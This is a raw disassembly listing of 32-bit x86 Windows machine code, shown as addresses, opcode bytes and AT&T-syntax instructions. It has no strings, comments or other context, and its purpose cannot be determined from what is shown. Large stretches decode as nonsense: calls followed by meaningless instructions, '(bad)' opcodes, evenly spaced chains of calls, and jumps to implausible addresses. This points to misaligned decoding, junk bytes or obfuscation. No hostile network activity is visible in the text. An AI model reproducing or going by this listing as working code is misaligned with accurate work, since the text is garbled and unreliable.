  402cc8:	8d 45 20             	lea    0x20(%ebp),%eax
  402ccb:	50                   	push   %eax
  402ccc:	8d 45 dc             	lea    -0x24(%ebp),%eax
  402ccf:	50                   	push   %eax
  402cd0:	ff 75 74             	push   0x74(%ebp)
  402cd3:	53                   	push   %ebx
  402cd4:	ff 75 60             	push   0x60(%ebp)
  402cd7:	ff 75 4c             	push   0x4c(%ebp)
  402cda:	53                   	push   %ebx
  402cdb:	53                   	push   %ebx
  402cdc:	ff 75 7c             	push   0x7c(%ebp)
  402cdf:	53                   	push   %ebx
  402ce0:	e8 a0 8b 00 00       	call   0x40b885
  402ce5:	31 85 c0 e8 d2 8b    	xor    %eax,-0x742d1740(%ebp)
  402ceb:	00 00                	add    %al,(%eax)
  402ced:	dd e8                	fucomp %st(0)
  402cef:	06                   	push   %es
  402cf0:	8c 00                	mov    %es,(%eax)
  402cf2:	00 c0                	add    %al,%al
  402cf4:	39 5d 5c             	cmp    %ebx,0x5c(%ebp)
  402cf7:	74 05                	je     0x402cfe
  402cf9:	ff 75 5c             	push   0x5c(%ebp)
  402cfc:	ff d6                	call   *%esi
  402cfe:	39 5d 58             	cmp    %ebx,0x58(%ebp)
  402d01:	74 05                	je     0x402d08
  402d03:	ff 75 58             	push   0x58(%ebp)
  402d06:	ff d6                	call   *%esi
  402d08:	39 5d 54             	cmp    %ebx,0x54(%ebp)
  402d0b:	74 05                	je     0x402d12
  402d0d:	ff 75 54             	push   0x54(%ebp)
  402d10:	ff d6                	call   *%esi
  402d12:	ff 75 24             	push   0x24(%ebp)
  402d15:	ff d6                	call   *%esi
  402d17:	f6 45 78 01          	testb  $0x1,0x78(%ebp)
  402d1b:	74 0b                	je     0x402d28
  402d1d:	6a ff                	push   $0xffffffff
  402d1f:	ff 75 20             	push   0x20(%ebp)
  402d22:	e8 53 91 00 00       	call   0x40be7a
  402d27:	20 39                	and    %bh,(%ecx)
  402d29:	5d                   	pop    %ebp
  402d2a:	3c 74                	cmp    $0x74,%al
  402d2c:	45                   	inc    %ebp
  402d2d:	e8 fc 8f 00 00       	call   0x40bd2e
  402d32:	57                   	push   %edi
  402d33:	e8 2c 90 00 00       	call   0x40bd64
  402d38:	37                   	aaa
  402d39:	6a 28                	push   $0x28
  402d3b:	e8 5e 90 00 00       	call   0x40bd9e
  402d40:	e8 8f 90 00 00       	call   0x40bdd4
  402d45:	59                   	pop    %ecx
  402d46:	59                   	pop    %ecx
  402d47:	57                   	push   %edi
  402d48:	8b f0                	mov    %eax,%esi
  402d4a:	e8 bb 90 00 00       	call   0x40be0a
  402d4f:	c4 8b 45 20 89 06    	les    0x6892045(%ebx),%ecx
  402d55:	8b 45 28             	mov    0x28(%ebp),%eax
  402d58:	89 46 04             	mov    %eax,0x4(%esi)
  402d5b:	8b 45 44             	mov    0x44(%ebp),%eax
  402d5e:	89 46 0c             	mov    %eax,0xc(%esi)
  402d61:	8b 45 50             	mov    0x50(%ebp),%eax
  402d64:	89 46 08             	mov    %eax,0x8(%esi)
  402d67:	8b 45 48             	mov    0x48(%ebp),%eax
  402d6a:	89 46 10             	mov    %eax,0x10(%esi)
  402d6d:	e8 d2 90 00 00       	call   0x40be44
  402d72:	ff 75 20             	push   0x20(%ebp)
  402d75:	ff d6                	call   *%esi
  402d77:	e8 7c 8f 00 00       	call   0x40bcf8
  402d7c:	39 5d 5c             	cmp    %ebx,0x5c(%ebp)
  402d7f:	74 05                	je     0x402d86
  402d81:	ff 75 5c             	push   0x5c(%ebp)
  402d84:	ff d6                	call   *%esi
  402d86:	39 5d 44             	cmp    %ebx,0x44(%ebp)
  402d89:	74 05                	je     0x402d90
  402d8b:	ff 75 44             	push   0x44(%ebp)
  402d8e:	ff d6                	call   *%esi
  402d90:	39 5d 50             	cmp    %ebx,0x50(%ebp)
  402d93:	74 05                	je     0x402d9a
  402d95:	ff 75 50             	push   0x50(%ebp)
  402d98:	ff d6                	call   *%esi
  402d9a:	39 5d 58             	cmp    %ebx,0x58(%ebp)
  402d9d:	74 05                	je     0x402da4
  402d9f:	ff 75 58             	push   0x58(%ebp)
  402da2:	ff d6                	call   *%esi
  402da4:	39 5d 54             	cmp    %ebx,0x54(%ebp)
  402da7:	74 05                	je     0x402dae
  402da9:	ff 75 54             	push   0x54(%ebp)
  402dac:	ff d6                	call   *%esi
  402dae:	39 5d 48             	cmp    %ebx,0x48(%ebp)
  402db1:	74 05                	je     0x402db8
  402db3:	ff 75 48             	push   0x48(%ebp)
  402db6:	ff d6                	call   *%esi
  402db8:	f6 45 78 78          	testb  $0x78,0x78(%ebp)
  402dbc:	e8 72 8b 00 00       	call   0x40b933
  402dc1:	53                   	push   %ebx
  402dc2:	39 5d 74             	cmp    %ebx,0x74(%ebp)
  402dc5:	75 34                	jne    0x402dfb
  402dc7:	57                   	push   %edi
  402dc8:	e8 bf 8e 00 00       	call   0x40bc8c
  402dcd:	8d 74 38 ff          	lea    -0x1(%eax,%edi,1),%esi
  402dd1:	3b f7                	cmp    %edi,%esi
  402dd3:	59                   	pop    %ecx
  402dd4:	76 25                	jbe    0x402dfb
  402dd6:	80 3e 5c             	cmpb   $0x5c,(%esi)
  402dd9:	74 05                	je     0x402de0
  402ddb:	4e                   	dec    %esi
  402ddc:	3b f7                	cmp    %edi,%esi
  402dde:	77 f6                	ja     0x402dd6
  402de0:	3b f7                	cmp    %edi,%esi
  402de2:	76 17                	jbe    0x402dfb
  402de4:	57                   	push   %edi
  402de5:	ff 75 7c             	push   0x7c(%ebp)
  402de8:	e8 d5 8e 00 00       	call   0x40bcc2
  402ded:	8b 45 7c             	mov    0x7c(%ebp),%eax
  402df0:	59                   	pop    %ecx
  402df1:	2b f7                	sub    %edi,%esi
  402df3:	59                   	pop    %ecx
  402df4:	88 5c 06 01          	mov    %bl,0x1(%esi,%eax,1)
  402df8:	89 45 74             	mov    %eax,0x74(%ebp)
  402dfb:	6a 3c                	push   $0x3c
  402dfd:	5e                   	pop    %esi
  402dfe:	56                   	push   %esi
  402dff:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402e02:	53                   	push   %ebx
  402e03:	50                   	push   %eax
  402e04:	e8 d8 8b 00 00       	call   0x40b9e1
  402e09:	0f b7 45 0c          	movzwl 0xc(%ebp),%eax
  402e0d:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402e10:	8b 45 74             	mov    0x74(%ebp),%eax
  402e13:	89 45 b8             	mov    %eax,-0x48(%ebp)
  402e16:	8b 45 70             	mov    0x70(%ebp),%eax
  402e19:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402e1c:	83 c4 0c             	add    $0xc,%esp
  402e1f:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402e22:	50                   	push   %eax
  402e23:	89 75 a0             	mov    %esi,-0x60(%ebp)
  402e26:	e8 ec 8b 00 00       	call   0x40ba17
  402e2b:	a3 11 e8 20 8c       	mov    %eax,0x8c20e811
  402e30:	00 00                	add    %al,(%eax)
  402e32:	85 f4                	test   %esi,%esp
  402e34:	89 7d b0             	mov    %edi,-0x50(%ebp)
  402e37:	e8 51 8c 00 00       	call   0x40ba8d
  402e3c:	bb 85 c0 74 60       	mov    $0x6074c085,%ebx
  402e41:	f6 45 78 01          	testb  $0x1,0x78(%ebp)
  402e45:	74 0b                	je     0x402e52
  402e47:	6a ff                	push   $0xffffffff
  402e49:	ff 75 d8             	push   -0x28(%ebp)
  402e4c:	e8 01 8e 00 00       	call   0x40bc52
  402e51:	0c 39                	or     $0x39,%al
  402e53:	5d                   	pop    %ebp
  402e54:	3c 74                	cmp    $0x74,%al
  402e56:	3a e8                	cmp    %al,%ch
  402e58:	e0 8c                	loopne 0x402de6
  402e5a:	00 00                	add    %al,(%eax)
  402e5c:	57                   	push   %edi
  402e5d:	e8 10 8d 00 00       	call   0x40bb72
  402e62:	72 6a                	jb     0x402ece
  402e64:	28 e8                	sub    %ch,%al
  402e66:	42                   	inc    %edx
  402e67:	8d 00                	lea    (%eax),%eax
  402e69:	00 e8                	add    %ch,%al
  402e6b:	73 8d                	jae    0x402dfa
  402e6d:	00 00                	add    %al,(%eax)
  402e6f:	59                   	pop    %ecx
  402e70:	59                   	pop    %ecx
  402e71:	57                   	push   %edi
  402e72:	8b f0                	mov    %eax,%esi
  402e74:	e8 9f 8d 00 00       	call   0x40bc18
  402e79:	aa                   	stos   %al,%es:(%edi)
  402e7a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402e7d:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  402e81:	89 06                	mov    %eax,(%esi)
  402e83:	89 5e 0c             	mov    %ebx,0xc(%esi)
  402e86:	89 5e 08             	mov    %ebx,0x8(%esi)
  402e89:	89 5e 10             	mov    %ebx,0x10(%esi)
  402e8c:	89 75 40             	mov    %esi,0x40(%ebp)
  402e8f:	eb 10                	jmp    0x402ea1
  402e91:	ff 75 d8             	push   -0x28(%ebp)
  402e94:	e8 2e 8c 00 00       	call   0x40bac7
  402e99:	32 e8                	xor    %al,%ch
  402e9b:	62 8c 00 00 d2 a4 ff 	bound  %ecx,-0x5b2e00(%eax,%eax,1)
  402ea2:	75 7c                	jne    0x402f20
  402ea4:	53                   	push   %ebx
  402ea5:	e8 c3 8a 00 00       	call   0x40b96d
  402eaa:	a3 e8 f7 8a 00       	mov    %eax,0x8af7e8
  402eaf:	00 f7                	add    %dh,%bh
  402eb1:	8b 45 40             	mov    0x40(%ebp),%eax
  402eb4:	5f                   	pop    %edi
  402eb5:	5e                   	pop    %esi
  402eb6:	5b                   	pop    %ebx
  402eb7:	83 c5 64             	add    $0x64,%ebp
  402eba:	c9                   	leave
  402ebb:	c2 14 00             	ret    $0x14
  402ebe:	6a 00                	push   $0x0
  402ec0:	6a 00                	push   $0x0
  402ec2:	e8 e6 86 00 00       	call   0x40b5ad
  402ec7:	50                   	push   %eax
  402ec8:	50                   	push   %eax
  402ec9:	ff 74 24 14          	push   0x14(%esp)
  402ecd:	e8 11 87 00 00       	call   0x40b5e3
  402ed2:	c2 04 00             	ret    $0x4
  402ed5:	e8 c9 46 00 00       	call   0x4075a3
  402eda:	6a 00                	push   $0x0
  402edc:	e8 32 47 00 00       	call   0x407613
  402ee1:	ba c3 56 6a 01       	mov    $0x16a56c3,%edx
  402ee6:	e8 a0 00 00 00       	call   0x402f8b
  402eeb:	ff 74 24 10          	push   0x10(%esp)
  402eef:	ff 74 24 0c          	push   0xc(%esp)
  402ef3:	ff 74 24 14          	push   0x14(%esp)
  402ef7:	e8 e7 00 00 00       	call   0x402fe3
  402efc:	50                   	push   %eax
  402efd:	ff 15 c0 52 40 00    	call   *0x4052c0
  402f03:	6a 00                	push   $0x0
  402f05:	8b f0                	mov    %eax,%esi
  402f07:	e8 7f 00 00 00       	call   0x402f8b
  402f0c:	8b c6                	mov    %esi,%eax
  402f0e:	5e                   	pop    %esi
  402f0f:	c2 0c 00             	ret    $0xc
  402f12:	6a 00                	push   $0x0
  402f14:	ff 74 24 0c          	push   0xc(%esp)
  402f18:	ff 74 24 0c          	push   0xc(%esp)
  402f1c:	e8 c2 ff ff ff       	call   0x402ee3
  402f21:	c2 08 00             	ret    $0x8
  402f24:	53                   	push   %ebx
  402f25:	56                   	push   %esi
  402f26:	57                   	push   %edi
  402f27:	8b 7c 24 10          	mov    0x10(%esp),%edi
  402f2b:	6a 00                	push   $0x0
  402f2d:	57                   	push   %edi
  402f2e:	ff 15 c4 52 40 00    	call   *0x4052c4
  402f34:	8b 1d 3c 52 40 00    	mov    0x40523c,%ebx
  402f3a:	8b f0                	mov    %eax,%esi
  402f3c:	ff d3                	call   *%ebx
  402f3e:	3b f0                	cmp    %eax,%esi
  402f40:	75 40                	jne    0x402f82
  402f42:	57                   	push   %edi
  402f43:	ff 15 c8 52 40 00    	call   *0x4052c8
  402f49:	85 c0                	test   %eax,%eax
  402f4b:	74 35                	je     0x402f82
  402f4d:	57                   	push   %edi
  402f4e:	ff 15 cc 52 40 00    	call   *0x4052cc
  402f54:	85 c0                	test   %eax,%eax
  402f56:	74 2a                	je     0x402f82
  402f58:	ff 15 d0 52 40 00    	call   *0x4052d0
  402f5e:	3b f8                	cmp    %eax,%edi
  402f60:	74 20                	je     0x402f82
  402f62:	6a 00                	push   $0x0
  402f64:	57                   	push   %edi
  402f65:	ff 15 d4 52 40 00    	call   *0x4052d4
  402f6b:	6a 10                	push   $0x10
  402f6d:	68 6c 57 40 00       	push   $0x40576c
  402f72:	e8 f6 05 00 00       	call   0x40356d
  402f77:	59                   	pop    %ecx
  402f78:	8b f0                	mov    %eax,%esi
  402f7a:	59                   	pop    %ecx
  402f7b:	89 7e 04             	mov    %edi,0x4(%esi)
  402f7e:	ff d3                	call   *%ebx
  402f80:	89 06                	mov    %eax,(%esi)
  402f82:	5f                   	pop    %edi
  402f83:	33 c0                	xor    %eax,%eax
  402f85:	5e                   	pop    %esi
  402f86:	40                   	inc    %eax
  402f87:	5b                   	pop    %ebx
  402f88:	c2 08 00             	ret    $0x8
  402f8b:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  402f90:	74 11                	je     0x402fa3
  402f92:	ff 74 24 04          	push   0x4(%esp)
  402f96:	68 24 2f 40 00       	push   $0x402f24
  402f9b:	ff 15 d8 52 40 00    	call   *0x4052d8
  402fa1:	eb 3d                	jmp    0x402fe0
  402fa3:	56                   	push   %esi
  402fa4:	8b 35 6c 57 40 00    	mov    0x40576c,%esi
  402faa:	85 f6                	test   %esi,%esi
  402fac:	74 31                	je     0x402fdf
  402fae:	53                   	push   %ebx
  402faf:	57                   	push   %edi
  402fb0:	8b 1e                	mov    (%esi),%ebx
  402fb2:	8d 7e 08             	lea    0x8(%esi),%edi
  402fb5:	ff 15 3c 52 40 00    	call   *0x40523c
  402fbb:	39 07                	cmp    %eax,(%edi)
  402fbd:	75 18                	jne    0x402fd7
  402fbf:	6a 01                	push   $0x1
  402fc1:	ff 76 0c             	push   0xc(%esi)
  402fc4:	ff 15 d4 52 40 00    	call   *0x4052d4
  402fca:	57                   	push   %edi
  402fcb:	68 6c 57 40 00       	push   $0x40576c
  402fd0:	e8 c5 05 00 00       	call   0x40359a
  402fd5:	59                   	pop    %ecx
  402fd6:	59                   	pop    %ecx
  402fd7:	85 db                	test   %ebx,%ebx
  402fd9:	8b f3                	mov    %ebx,%esi
  402fdb:	75 d3                	jne    0x402fb0
  402fdd:	5f                   	pop    %edi
  402fde:	5b                   	pop    %ebx
  402fdf:	5e                   	pop    %esi
  402fe0:	c2 04 00             	ret    $0x4
  402fe3:	55                   	push   %ebp
  402fe4:	8b ec                	mov    %esp,%ebp
  402fe6:	51                   	push   %ecx
  402fe7:	56                   	push   %esi
  402fe8:	ff 15 d0 52 40 00    	call   *0x4052d0
  402fee:	8b f0                	mov    %eax,%esi
  402ff0:	85 f6                	test   %esi,%esi
  402ff2:	74 18                	je     0x40300c
  402ff4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402ff7:	50                   	push   %eax
  402ff8:	56                   	push   %esi
  402ff9:	ff 15 c4 52 40 00    	call   *0x4052c4
  402fff:	ff 15 8c 52 40 00    	call   *0x40528c
  403005:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  403008:	74 02                	je     0x40300c
  40300a:	33 f6                	xor    %esi,%esi
  40300c:	8b c6                	mov    %esi,%eax
  40300e:	5e                   	pop    %esi
  40300f:	c9                   	leave
  403010:	c3                   	ret
  403011:	55                   	push   %ebp
  403012:	8b ec                	mov    %esp,%ebp
  403014:	8b 45 08             	mov    0x8(%ebp),%eax
  403017:	e8 ac 4e 00 00       	call   0x407ec8
  40301c:	cf                   	iret
  40301d:	56                   	push   %esi
  40301e:	83 ce ff             	or     $0xffffffff,%esi
  403021:	85 c0                	test   %eax,%eax
  403023:	57                   	push   %edi
  403024:	8b fe                	mov    %esi,%edi
  403026:	e8 d7 4e 00 00       	call   0x407f02
  40302b:	70 80                	jo     0x402fad
  40302d:	38 00                	cmp    %al,(%eax)
  40302f:	e8 08 4f 00 00       	call   0x407f3c
  403034:	f5                   	cmc
  403035:	e8 3c 4f 00 00       	call   0x407f76
  40303a:	50                   	push   %eax
  40303b:	e8 6c 4f 00 00       	call   0x407fac
  403040:	18 50 e8             	sbb    %dl,-0x18(%eax)
  403043:	9f                   	lahf
  403044:	4f                   	dec    %edi
  403045:	00 00                	add    %al,(%eax)
  403047:	e8 0a 50 00 00       	call   0x408056
  40304c:	ae                   	scas   %es:(%edi),%al
  40304d:	50                   	push   %eax
  40304e:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  403052:	e8 39 50 00 00       	call   0x408090
  403057:	83 c4 10             	add    $0x10,%esp
  40305a:	83 f8 02             	cmp    $0x2,%eax
  40305d:	e8 64 50 00 00       	call   0x4080c6
  403062:	4f                   	dec    %edi
  403063:	4c                   	dec    %esp
  403064:	74 05                	je     0x40306b
  403066:	83 f8 03             	cmp    $0x3,%eax
  403069:	75 3d                	jne    0x4030a8
  40306b:	e8 91 50 00 00       	call   0x408101
  403070:	55                   	push   %ebp
  403071:	7e 75                	jle    0x4030e8
  403073:	34 83                	xor    $0x83,%al
  403075:	f8                   	clc
  403076:	02 75 13             	add    0x13(%ebp),%dh
  403079:	e8 ed 53 00 00       	call   0x40846b
  40307e:	aa                   	stos   %al,%es:(%edi)
  40307f:	e8 21 54 00 00       	call   0x4084a5
  403084:	50                   	push   %eax
  403085:	e8 51 54 00 00       	call   0x4084db
  40308a:	59                   	pop    %ecx
  40308b:	59                   	pop    %ecx
  40308c:	e8 2c 53 00 00       	call   0x4083bd
  403091:	fd                   	std
  403092:	50                   	push   %eax
  403093:	e8 5f 53 00 00       	call   0x4083f7
  403098:	b7 83                	mov    $0x83,%bh
  40309a:	f8                   	clc
  40309b:	01 e8                	add    %ebp,%eax
  40309d:	90                   	nop
  40309e:	53                   	push   %ebx
  40309f:	00 00                	add    %al,(%eax)
  4030a1:	93                   	xchg   %eax,%ebx
  4030a2:	eb 78                	jmp    0x40311c
  4030a4:	c6 01 00             	movb   $0x0,(%ecx)
  4030a7:	49                   	dec    %ecx
  4030a8:	80 39 5c             	cmpb   $0x5c,(%ecx)
  4030ab:	74 f7                	je     0x4030a4
  4030ad:	e8 8a 50 00 00       	call   0x40813c
  4030b2:	ad                   	lods   %ds:(%esi),%eax
  4030b3:	50                   	push   %eax
  4030b4:	e8 bd 50 00 00       	call   0x408176
  4030b9:	15 50 e8 f0 50       	adc    $0x50f0e850,%eax
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	e5 83                	in     $0x83,%eax
  4030c2:	f8                   	clc
  4030c3:	ff 74 2e e8          	push   -0x18(%esi,%ebp,1)
  4030c7:	09 52 00             	or     %edx,0x0(%edx)
  4030ca:	00 45 b9             	add    %al,-0x47(%ebp)
  4030cd:	74 08                	je     0x4030d7
  4030cf:	6a fe                	push   $0xfffffffe
  4030d1:	5f                   	pop    %edi
  4030d2:	83 ce ff             	or     $0xffffffff,%esi
  4030d5:	eb 14                	jmp    0x4030eb
  4030d7:	e8 33 52 00 00       	call   0x40830f
  4030dc:	8d                   	lea    (bad),%ebp
  4030dd:	e8 67 52 00 00       	call   0x408349
  4030e2:	e8 33 ff 33 d2       	call   0xd274301a
  4030e7:	0b f9                	or     %ecx,%edi
  4030e9:	0b f2                	or     %edx,%esi
  4030eb:	50                   	push   %eax
  4030ec:	e8 92 52 00 00       	call   0x408383
  4030f1:	15 eb 2e e8 f1       	adc    $0xf1e82eeb,%eax
  4030f6:	50                   	push   %eax
  4030f7:	00 00                	add    %al,(%eax)
  4030f9:	e8 d9 75 25 e8       	call   0xe865a6d7
  4030fe:	23 51 00             	and    0x0(%ecx),%edx
  403101:	00 d0                	add    %dl,%al
  403103:	8b 75 1c             	mov    0x1c(%ebp),%esi
  403106:	e8 55 51 00 00       	call   0x408260
  40310b:	1b 50 e8             	sbb    -0x18(%eax),%edx
  40310e:	88 51 00             	mov    %dl,0x0(%ecx)
  403111:	00 17                	add    %dl,(%edi)
  403113:	83 f8 ff             	cmp    $0xffffffff,%eax
  403116:	74 0a                	je     0x403122
  403118:	a8 10                	test   $0x10,%al
  40311a:	74 06                	je     0x403122
  40311c:	6a fe                	push   $0xfffffffe
  40311e:	83 ce ff             	or     $0xffffffff,%esi
  403121:	5f                   	pop    %edi
  403122:	8b c7                	mov    %edi,%eax
  403124:	5f                   	pop    %edi
  403125:	8b d6                	mov    %esi,%edx
  403127:	5e                   	pop    %esi
  403128:	c9                   	leave
  403129:	c2 04 00             	ret    $0x4
  40312c:	55                   	push   %ebp
  40312d:	8b ec                	mov    %esp,%ebp
  40312f:	e8 a9 b4 00 00       	call   0x40e5dd
  403134:	92                   	xchg   %eax,%edx
  403135:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403139:	74 64                	je     0x40319f
  40313b:	e8 d7 b4 00 00       	call   0x40e617
  403140:	ff 75 08             	push   0x8(%ebp)
  403143:	e8 05 b5 00 00       	call   0x40e64d
  403148:	0a 50 e8             	or     -0x18(%eax),%dl
  40314b:	38 b5 00 00 e8 69    	cmp    %dh,0x69e80000(%ebp)
  403151:	b5 00                	mov    $0x0,%ch
  403153:	00 e1                	add    %ah,%cl
  403155:	50                   	push   %eax
  403156:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  40315a:	e8 98 b5 00 00       	call   0x40e6f7
  40315f:	83 c4 10             	add    $0x10,%esp
  403162:	e8 c6 b5 00 00       	call   0x40e72d
  403167:	e9 6f eb 16 8d       	jmp    0x8d571cdb
  40316c:	48                   	dec    %eax
  40316d:	ff 8a 11 80 fa 20    	decl   0x20fa8011(%edx)
  403173:	74 0a                	je     0x40317f
  403175:	80 fa 5c             	cmp    $0x5c,%dl
  403178:	74 05                	je     0x40317f
  40317a:	80 fa 2f             	cmp    $0x2f,%dl
  40317d:	75 0c                	jne    0x40318b
  40317f:	8b c1                	mov    %ecx,%eax
  403181:	e8 e2 b5 00 00       	call   0x40e768
  403186:	3b 3b                	cmp    (%ebx),%edi
  403188:	c1 77 e0 c6          	shll   $0xc6,-0x20(%edi)
  40318c:	00 00                	add    %al,(%eax)
  40318e:	6a 00                	push   $0x0
  403190:	e8 0d b6 00 00       	call   0x40e7a2
  403195:	9c                   	pushf
  403196:	50                   	push   %eax
  403197:	e8 40 b6 00 00       	call   0x40e7dc
  40319c:	dd eb                	fucomp %st(3)
  40319e:	02 33                	add    (%ebx),%dh
  4031a0:	c0 c9 c2             	ror    $0xc2,%cl
  4031a3:	04 00                	add    $0x0,%al
  4031a5:	53                   	push   %ebx
  4031a6:	56                   	push   %esi
  4031a7:	57                   	push   %edi
  4031a8:	ff 74 24 10          	push   0x10(%esp)
  4031ac:	33 f6                	xor    %esi,%esi
  4031ae:	e8 e9 a1 00 00       	call   0x40d39c
  4031b3:	d1 e8                	shr    $1,%eax
  4031b5:	1d a2 00 00 8b       	sbb    $0x8b0000a2,%eax
  4031ba:	f8                   	clc
  4031bb:	85 ff                	test   %edi,%edi
  4031bd:	74 0c                	je     0x4031cb
  4031bf:	8d 47 34             	lea    0x34(%edi),%eax
  4031c2:	50                   	push   %eax
  4031c3:	e8 b0 a2 00 00       	call   0x40d478
  4031c8:	59                   	pop    %ecx
  4031c9:	8b f0                	mov    %eax,%esi
  4031cb:	ff 74 24 14          	push   0x14(%esp)
  4031cf:	56                   	push   %esi
  4031d0:	e8 37 a2 00 00       	call   0x40d40c
  4031d5:	85 f6                	test   %esi,%esi
  4031d7:	8b d8                	mov    %eax,%ebx
  4031d9:	74 0c                	je     0x4031e7
  4031db:	83 c7 34             	add    $0x34,%edi
  4031de:	57                   	push   %edi
  4031df:	53                   	push   %ebx
  4031e0:	e8 5d a2 00 00       	call   0x40d442
  4031e5:	59                   	pop    %ecx
  4031e6:	59                   	pop    %ecx
  4031e7:	5f                   	pop    %edi
  4031e8:	c6 04 33 00          	movb   $0x0,(%ebx,%esi,1)
  4031ec:	5e                   	pop    %esi
  4031ed:	5b                   	pop    %ebx
  4031ee:	c2 08 00             	ret    $0x8
  4031f1:	56                   	push   %esi
  4031f2:	ff 74 24 08          	push   0x8(%esp)
  4031f6:	33 f6                	xor    %esi,%esi
  4031f8:	e8 d1 a4 00 00       	call   0x40d6ce
  4031fd:	28 e8                	sub    %ch,%al
  4031ff:	05 a5 00 00 85       	add    $0x850000a5,%eax
  403204:	c0 74 0c f6 40       	shlb   $0x40,-0xa(%esp,%ecx,1)
  403209:	08 10                	or     %dl,(%eax)
  40320b:	56                   	push   %esi
  40320c:	58                   	pop    %eax
  40320d:	0f 95 c0             	setne  %al
  403210:	40                   	inc    %eax
  403211:	8b f0                	mov    %eax,%esi
  403213:	8b c6                	mov    %esi,%eax
  403215:	5e                   	pop    %esi
  403216:	c2 04 00             	ret    $0x4
  403219:	ff 74 24 04          	push   0x4(%esp)
  40321d:	e8 f4 9f 00 00       	call   0x40d216
  403222:	4e                   	dec    %esi
  403223:	e8 28 a0 00 00       	call   0x40d250
  403228:	85 c0                	test   %eax,%eax
  40322a:	74 1d                	je     0x403249
  40322c:	8b 00                	mov    (%eax),%eax
  40322e:	83 f8 ff             	cmp    $0xffffffff,%eax
  403231:	74 07                	je     0x40323a
  403233:	50                   	push   %eax
  403234:	e8 bd a0 00 00       	call   0x40d2f6
  403239:	bc ff 74 24 04       	mov    $0x42474ff,%esp
  40323e:	e8 43 a0 00 00       	call   0x40d286
  403243:	93                   	xchg   %eax,%ebx
  403244:	e8 77 a0 00 00       	call   0x40d2c0
  403249:	c2 04 00             	ret    $0x4
  40324c:	55                   	push   %ebp
  40324d:	8b ec                	mov    %esp,%ebp
  40324f:	e8 7c 97 00 00       	call   0x40c9d0
  403254:	f7 53 56             	notl   0x56(%ebx)
  403257:	57                   	push   %edi
  403258:	33 db                	xor    %ebx,%ebx
  40325a:	33 ff                	xor    %edi,%edi
  40325c:	e8 a9 97 00 00       	call   0x40ca0a
  403261:	4b                   	dec    %ebx
  403262:	75 16                	jne    0x40327a
  403264:	e8 38 9c 00 00       	call   0x40cea1
  403269:	6a 10                	push   $0x10
  40326b:	e8 67 9c 00 00       	call   0x40ced7
  403270:	e8 98 9c 00 00       	call   0x40cf0d
  403275:	e8 c9 9c 00 00       	call   0x40cf43
  40327a:	8b 75 0c             	mov    0xc(%ebp),%esi
  40327d:	3b f3                	cmp    %ebx,%esi
  40327f:	75 05                	jne    0x403286
  403281:	e8 e5 9b 00 00       	call   0x40ce6b
  403286:	e8 b9 97 00 00       	call   0x40ca44
  40328b:	e8 ea 97 00 00       	call   0x40ca7a
  403290:	38 56 50             	cmp    %dl,0x50(%esi)
  403293:	e8 1c 98 00 00       	call   0x40cab4
  403298:	56                   	push   %esi
  403299:	88 5d fc             	mov    %bl,-0x4(%ebp)
  40329c:	e8 49 98 00 00       	call   0x40caea
  4032a1:	83 c4 10             	add    $0x10,%esp
  4032a4:	3b c3                	cmp    %ebx,%eax
  4032a6:	74 1a                	je     0x4032c2
  4032a8:	e8 e2 9a 00 00       	call   0x40cd8f
  4032ad:	74 13                	je     0x4032c2
  4032af:	e8 11 9b 00 00       	call   0x40cdc5
  4032b4:	df e8                	fucomip %st(0),%st
  4032b6:	45                   	inc    %ebp
  4032b7:	9b                   	fwait
  4032b8:	00 00                	add    %al,(%eax)
  4032ba:	50                   	push   %eax
  4032bb:	e8 75 9b 00 00       	call   0x40ce35
  4032c0:	59                   	pop    %ecx
  4032c1:	59                   	pop    %ecx
  4032c2:	8b 45 10             	mov    0x10(%ebp),%eax
  4032c5:	3b c3                	cmp    %ebx,%eax
  4032c7:	74 04                	je     0x4032cd
  4032c9:	38 18                	cmp    %bl,(%eax)
  4032cb:	75 05                	jne    0x4032d2
  4032cd:	e8 4e 98 00 00       	call   0x40cb20
  4032d2:	50                   	push   %eax
  4032d3:	e8 7e 98 00 00       	call   0x40cb56
  4032d8:	93                   	xchg   %eax,%ebx
  4032d9:	50                   	push   %eax
  4032da:	e8 b1 98 00 00       	call   0x40cb90
  4032df:	59                   	pop    %ecx
  4032e0:	59                   	pop    %ecx
  4032e1:	ff 75 08             	push   0x8(%ebp)
  4032e4:	e8 dd 98 00 00       	call   0x40cbc6
  4032e9:	43                   	inc    %ebx
  4032ea:	e8 11 99 00 00       	call   0x40cc00
  4032ef:	8b f0                	mov    %eax,%esi
  4032f1:	8d 46 08             	lea    0x8(%esi),%eax
  4032f4:	50                   	push   %eax
  4032f5:	e8 3c 99 00 00       	call   0x40cc36
  4032fa:	f7 50 e8             	notl   -0x18(%eax)
  4032fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4032fe:	99                   	cltd
  4032ff:	00 00                	add    %al,(%eax)
  403301:	18 83 f8 ff 89 06    	sbb    %al,0x689fff8(%ebx)
  403307:	74 05                	je     0x40330e
  403309:	89 5e 04             	mov    %ebx,0x4(%esi)
  40330c:	eb 12                	jmp    0x403320
  40330e:	e8 97 99 00 00       	call   0x40ccaa
  403313:	b8 83 f8 02 75       	mov    $0x7502f883,%eax
  403318:	0b e8                	or     %eax,%ebp
  40331a:	36 9a 00 00 70 60 8b 	ss lcall $0xfe8b,$0x60700000
  403321:	fe 
  403322:	eb 14                	jmp    0x403338
  403324:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  403328:	75 0c                	jne    0x403336
  40332a:	56                   	push   %esi
  40332b:	e8 b4 99 00 00       	call   0x40cce4
  403330:	3e e8 e8 99 00 00    	ds call 0x40cd1e
  403336:	89 1e                	mov    %ebx,(%esi)
  403338:	8b c7                	mov    %edi,%eax
  40333a:	5f                   	pop    %edi
  40333b:	5e                   	pop    %esi
  40333c:	5b                   	pop    %ebx
  40333d:	c9                   	leave
  40333e:	c2 0c 00             	ret    $0xc
